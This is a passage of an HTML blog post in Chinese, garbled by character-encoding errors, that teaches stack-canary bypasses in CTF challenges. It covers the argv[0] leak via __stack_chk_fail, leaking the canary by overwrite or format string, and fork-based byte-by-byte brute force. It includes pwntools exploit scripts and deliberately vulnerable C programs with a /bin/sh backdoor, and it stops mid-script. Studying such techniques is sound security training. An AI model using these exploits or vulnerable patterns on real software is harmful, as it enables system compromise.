å°„ä¸¤æ¬¡</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦ä¸€å¤„çš„åœ°å€æ¥è¿›è¡Œè¾“å‡ºï¼Œå¯ä»¥ä½¿ç”¨ gdb çš„ find æ¥è¿›è¡ŒæŸ¥æ‰¾ã€‚</li><li>æ‰€ä»¥byte_600D20ä¸­çš„flagåœ¨400D20ä¸­å…¶å®è¿˜æœ‰ä¸€ä»½ï¼Œä½†æ˜¯å¾—ç¨‹åºåŠ è½½æ‰ä¼šæœ‰</li><li>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠargv[0]ä¿®æ”¹ä¸º400D20ï¼Œè¿™æ ·æˆ‘ä»¬è§¦å‘æ ˆæº¢å‡ºï¼Œè¿™æ ·ç”±äºCanaryä¿æŠ¤æ£€æµ‹ï¼Œå°±ä¼šè¾“å‡ºä¿å­˜ä¿¡æ¯å’Œargv[0]ï¼Œè¿™æ ·å°±è¾“å‡ºäº†flag</li></ul></blockquote><p><img src="/2023/04/09/canary/2-4.png"></p><p>æŸ¥æ‰¾argv[0]åœ°å€ï¼š0x7fffffffdf08</p><p><img src="/2023/04/09/canary/2-5.png"></p><p>è®¡ç®—argv[0]è·ç¦»_IO_getså‡½æ•°è¾“å…¥ç‚¹çš„åç§»ï¼š0x7fffffffdf08 - 0x7fffffffdcf0 = 536</p><p><img src="/2023/04/09/canary/2-6.png"></p><p>åˆ©ç”¨æ ˆæº¢å‡ºè¦†ç›–argv[0]ä¸º0x400D20ï¼Œexpï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./smashes"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">536</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400D20</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name? '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'flag: '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/09/canary/2-7.png"></p><h4 id="2018-ç½‘é¼æ¯-guess"><a href="#2018-ç½‘é¼æ¯-guess" class="headerlink" title="2018 ç½‘é¼æ¯ - guess"></a>2018 ç½‘é¼æ¯ - guess</h4><p>å‰ç½®çŸ¥è¯†ï¼šåœ¨linuxåº”ç”¨ç¨‹åºè¿è¡Œæ—¶ï¼Œå†…å­˜çš„æœ€é«˜ç«¯æ˜¯ç¯å¢ƒ/å‚æ•°èŠ‚ï¼ˆenvironment/argumentsâ€¯sectionï¼‰ ç”¨æ¥å­˜å‚¨ç³»ç»Ÿç¯å¢ƒå˜é‡çš„ä¸€ä»½å¤åˆ¶æ–‡ä»¶ï¼Œè¿›ç¨‹åœ¨è¿è¡Œæ—¶å¯èƒ½éœ€è¦ã€‚ ä¾‹å¦‚ï¼Œè¿è¡Œä¸­çš„è¿›ç¨‹ï¼Œå¯ä»¥é€šè¿‡ç¯å¢ƒå˜é‡æ¥è®¿é—®è·¯å¾„ã€shellâ€¯åç§°ã€ä¸»æœºåç­‰ä¿¡æ¯ã€‚ è¯¥èŠ‚æ˜¯å¯å†™çš„ï¼Œå› æ­¤åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å’Œç¼“å†²åŒºæº¢å‡ºæ”»å‡»ä¸­éƒ½å¯ä»¥æ”»å‡»è¯¥èŠ‚ã€‚ *environæŒ‡é’ˆæŒ‡å‘æ ˆåœ°å€(ç¯å¢ƒå˜é‡ä½ç½®)ï¼Œæœ‰æ—¶å®ƒä¹Ÿæˆä¸ºæ”»å‡»çš„å¯¹è±¡ï¼Œæ³„éœ²æ ˆåœ°å€ï¼Œç¯¡æ”¹æ ˆç©ºé—´åœ°å€ï¼Œè¿›è€ŒåŠ«æŒæ§åˆ¶æµã€‚</p><p><strong>_environï¼š</strong></p><ul><li><p><strong>åœ¨Linux Cä¸­ï¼Œenvironæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå®ƒå‚¨å­˜ç€ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ã€‚</strong></p></li><li><p>å®ƒå‚¨å­˜åœ¨libcä¸­ï¼Œå› æ­¤environæ˜¯æ²Ÿé€šlibcåœ°å€ä¸æ ˆåœ°å€çš„æ¡¥æ¢ã€‚</p></li></ul><p><strong>environåˆ©ç”¨ï¼š</strong></p><ul><li><strong>é€šè¿‡libcæ‰¾åˆ°environåœ°å€åï¼Œæ³„éœ²environåœ°å€å¤„çš„å€¼ï¼Œå¯ä»¥å¾—åˆ°ç¯å¢ƒå˜é‡åœ°å€ï¼Œç¯å¢ƒå˜é‡ä¿å­˜åœ¨æ ˆä¸­ï¼Œé€šè¿‡åç§»å¯ä»¥å¾—åˆ°æ ˆä¸Šä»»æ„å˜é‡çš„åœ°å€ã€‚</strong></li></ul><p>ç¨‹åºå¼€å¯äº†Canaryå’ŒNXä¿æŠ¤ï¼Œç¨‹åºé€»è¾‘å¦‚ä¸‹ï¼š</p><ul><li>å°†flag.txtæ–‡ä»¶ä¸­çš„flagæ”¾å…¥real_flagä¸­</li><li>forkåˆ›å»ºå­è¿›ç¨‹ï¼ˆ3æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬åªæœ‰ä¸‰æ¬¡æœºä¼š</li><li>ä½¿ç”¨getså‡½æ•°è¾“å…¥çŒœæµ‹çš„guess_flagï¼Œå­˜åœ¨æº¢å‡º</li></ul><p>è¿™é¢˜ä¸å‰é¢32C3 CTF readmeè¿™é¢˜ç±»ä¼¼ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯è¿™æ¬¡çš„flagæ˜¯æ”¾åœ¨äº†æ ˆä¸Šï¼Œè€Œä¸åƒä¸Šä¸€é¢˜ç›´æ¥æ”¾åœ¨BSSæ®µä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ³„æ¼flagå­˜æ”¾çš„ä½ç½®ï¼ˆæ ˆåœ°å€</p><p>æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li><p>æ‰¾åˆ°argv[0]ä¸è¾“å…¥ç‚¹çš„åç§»</p></li><li><p>æ³„æ¼å­˜æ”¾real_flagçš„æ ˆåœ°å€</p><ul><li>è®¡ç®—real_flagä¸environçš„åç§»</li><li>æ³„æ¼libcï¼Œè®¡ç®—environçš„åœ°å€ï¼Œç„¶åæ³„æ¼environæ ˆåœ°å€</li><li>è®¡ç®—real_flagçš„æ ˆåœ°å€</li></ul></li><li><p>å°†argv[0]åœ°å€çš„æ¢æˆreal_flagæ ˆåœ°å€ï¼Œç„¶åè§¦å‘æ ˆæº¢å‡ºï¼Œæ‰“å°å‡ºflag</p></li></ul><p><img src="/2023/04/09/canary/4-1.png"></p><p>1ã€æ‰¾åˆ°argv[0]ä¸è¾“å…¥ç‚¹çš„åç§»ï¼š0x7fffffffdf08 - 0x7fffffffdde0 = 0x128</p><p><img src="/2023/04/09/canary/4-2.png"></p><p>2ã€æ³„æ¼å­˜æ”¾real_flagçš„æ ˆåœ°å€</p><ul><li>è®¡ç®—real_flagä¸environçš„åç§»ï¼š0x7fffffffdf18 - 0x7fffffffddb0 = 0x168</li><li>æ³„æ¼libcï¼Œè®¡ç®—environçš„åœ°å€ï¼Œç„¶åæ³„æ¼environæ ˆåœ°å€ï¼šenviron_addr</li><li>è®¡ç®—real_flagçš„æ ˆåœ°å€ï¼šenviron_addr - 0x168</li></ul><p><img src="/2023/04/09/canary/4-3.png"></p><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./guess"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./guess"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> flag<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x128</span> <span class="token operator">+</span> contentio<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'flag\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">not</span> flag<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'***: '</span><span class="token punctuation">)</span><span class="token keyword">return</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">' terminated'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#æ³„æ¼libc</span>puts <span class="token operator">=</span> leak<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#æ³„æ¼putå‡½æ•°gotè¡¨é¡¹å†…å®¹</span>libc_base <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#è®¡ç®—libc_base</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>environ <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_environ'</span><span class="token punctuation">]</span> <span class="token comment">#è®¡ç®—environåœ°å€</span>environ <span class="token operator">=</span> leak<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#æ³„æ¼æ ˆåœ°å€</span>flag <span class="token operator">=</span> environ <span class="token operator">-</span> <span class="token number">0x168</span> <span class="token comment">#è®¡ç®—flagæ ˆåœ°å€</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>leak<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/09/canary/4-4.png"></p><h2 id="æ³„éœ²æ ˆä¸­çš„-Canary"><a href="#æ³„éœ²æ ˆä¸­çš„-Canary" class="headerlink" title="æ³„éœ²æ ˆä¸­çš„ Canary"></a>æ³„éœ²æ ˆä¸­çš„ Canary</h2><h3 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>1ã€Canary è®¾è®¡ä¸ºä»¥å­—èŠ‚ <code>\x00</code> ç»“å°¾ï¼Œæœ¬æ„æ˜¯ä¸ºäº†ä¿è¯ Canary å¯ä»¥æˆªæ–­å­—ç¬¦ä¸²ã€‚ æ³„éœ²æ ˆä¸­çš„ Canary çš„æ€è·¯æ˜¯è¦†ç›– Canary çš„ä½å­—èŠ‚ï¼Œæ¥æ‰“å°å‡ºå‰©ä½™çš„ Canary éƒ¨åˆ†ã€‚ è¿™ç§åˆ©ç”¨æ–¹å¼éœ€è¦å­˜åœ¨åˆé€‚çš„è¾“å‡ºå‡½æ•°ï¼Œå¹¶ä¸”å¯èƒ½éœ€è¦å¤šæ¬¡æº¢å‡ºï¼Œç¬¬ä¸€æ¬¡æº¢å‡ºæ³„éœ² Canaryï¼Œä¹‹åå†æ¬¡æº¢å‡ºæ§åˆ¶æ‰§è¡Œæµç¨‹ã€‚</p><ul><li>å¯ä»¥çœ‹åˆ°Canaryçš„ä½å­—èŠ‚ä¸º00</li></ul><p><img src="/2023/04/09/canary/5-0.png"></p><p>2ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›´æ¥æ³„æ¼Canaryçš„å€¼</p><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><p>æµ‹è¯•ç¨‹åºï¼ˆwikiï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc -m32 -no-pie -0 leak_canary leak_canary.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hello Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¯¥ç¨‹åºå¼€å¯äº†Canaryå’ŒNXä¿æŠ¤</p><ul><li>vulnå‡½æ•°ä¸­readè¯»å…¥0x200ä¸ªå­—ç¬¦ï¼Œå­˜åœ¨æº¢å‡º</li><li>vulnå‡½æ•°ä¸­printf(buf)å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li><li>å­˜åœ¨getshellåé—¨å‡½æ•°</li></ul><blockquote><p>æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å’Œåé—¨å‡½æ•°ï¼Œæ˜¯ä¸æ˜¯æƒ³hijack retaddr</p><p>æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¹¶ä¸”æ²¡æœ‰å¼€å¯RELROä¿æŠ¤ï¼Œæ˜¯ä¸æ˜¯æƒ³hijack GOT</p></blockquote><p>1ã€è¦†ç›– Canary çš„ä½å­—èŠ‚</p><p>Canaryè¢«æ”¾åœ¨äº†ebp - 0xcå¤„ï¼Œåœ¨IDAé‡Œé¢å¯ä»¥çœ‹åˆ°ebpè·ç¦»è¾“å…¥ç‚¹çš„åç§»ä¸º0x70 ==&gt; Canaryè·ç¦»è¾“å…¥ç‚¹çš„åç§»ä¸º0x70 - 0xc = 0x64 == 100</p><p><img src="/2023/04/09/canary/5-1.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./leak_canary"</span><span class="token punctuation">)</span>shell <span class="token operator">=</span> <span class="token number">0x80485A4</span><span class="token comment">#æŠŠCanaryçš„ä½å­—èŠ‚è¦†ç›–ä¸º'A'å³0x41</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">101</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'!\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x41</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span><span class="token string">'dead'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›´æ¥æ³„æ¼Canary</p><ul><li>è°ƒè¯•å¾—ï¼šCanaryä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬31ä¸ªå‚æ•° ==&gt; %31$på¯ä»¥æ³„æ¼Canaryçš„å€¼</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./leak_canary"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./leak_canary"</span><span class="token punctuation">)</span><span class="token comment">#æ³„æ¼canary</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'!\n'</span><span class="token punctuation">,</span> <span class="token string">'%31$p'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'canary: %s'</span> <span class="token operator">%</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token comment">#ret2text</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="one-by-oneçˆ†ç ´Canary"><a href="#one-by-oneçˆ†ç ´Canary" class="headerlink" title="one by oneçˆ†ç ´Canary"></a>one by oneçˆ†ç ´Canary</h2><h3 id="åŸç†-3"><a href="#åŸç†-3" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>å¯¹äº Canaryï¼Œè™½ç„¶æ¯æ¬¡è¿›ç¨‹é‡å¯åçš„ Canary ä¸åŒ (ç›¸æ¯” GSï¼ŒGS é‡å¯åæ˜¯ç›¸åŒçš„)ï¼Œä½†æ˜¯åŒä¸€ä¸ªè¿›ç¨‹ä¸­çš„ä¸åŒçº¿ç¨‹çš„ Canary æ˜¯ç›¸åŒçš„ã€‚one by oneçˆ†ç ´æ€æƒ³æ˜¯åˆ©ç”¨<code>fork</code>å‡½æ•°æ¥ä¸æ–­é€å­—èŠ‚æ³„éœ²ã€‚è¿™é‡Œä»‹ç»ä¸€ä¸‹forkå‡½æ•°ï¼Œ<strong>forkå‡½æ•°ä½œç”¨æ˜¯é€šè¿‡ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€ä¸ªä¸åŸæ¥è¿›ç¨‹å‡ ä¹å®Œå…¨ç›¸åŒçš„è¿›ç¨‹ï¼Œè¿™é‡Œçš„ç›¸åŒä¹ŸåŒ…æ‹¬canary</strong>ã€‚<font color="red">å½“ç¨‹åºå­˜åœ¨forkå‡½æ•°å¹¶è§¦å‘canaryæ—¶ï¼Œ__ stack_chk_failå‡½æ•°<strong>åªèƒ½å…³é—­forkå‡½æ•°æ‰€å»ºç«‹çš„è¿›ç¨‹ï¼Œä¸ä¼šè®©ä¸»è¿›ç¨‹é€€å‡º</strong></font>ï¼Œæ‰€ä»¥å½“å­˜åœ¨å¤§é‡è°ƒç”¨forkå‡½æ•°æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥ä¸€å­—èŠ‚ä¸€å­—èŠ‚çš„æ³„éœ²ï¼Œæ‰€ä»¥å«åšone by oneçˆ†ç ´ã€‚</p><h3 id="ä¾‹å­-1"><a href="#ä¾‹å­-1" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><p>æµ‹è¯•ä»£ç ï¼ˆä¸Šä¸ªæµ‹è¯•ä»£ç ç¨å¾®ä¿®æ”¹ï¼š</p><ul><li>è¿™é“é¢˜æœ‰forkå‡½æ•°ï¼Œä¼šå¾ªç¯åˆ›å»ºå­è¿›ç¨‹</li><li>æ²¡æœ‰äº†printfè¾“å‡ºå‡½æ•°</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc -m32 -fstack-protector -o one_by_one one_by_one.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello Hacker!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time <span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token 